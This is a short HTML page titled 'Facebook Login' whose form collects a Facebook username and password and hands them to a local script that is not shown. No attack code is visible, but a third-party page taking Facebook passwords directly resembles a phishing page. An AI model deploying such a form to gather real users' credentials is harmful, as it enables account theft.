<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Facebook Login</title>
</head>

<body>
    <h1>Login with Facebook</h1>
    <form id="facebookLoginForm">
        <input type="text" id="facebookUsername" placeholder="Facebook Username" required>
        <input type="password" id="facebookPassword" placeholder="Facebook Password" required>
        <button type="submit">Login</button>
    </form>

    <script src="src/facebookLogin.js"></script>
</body>

</html>
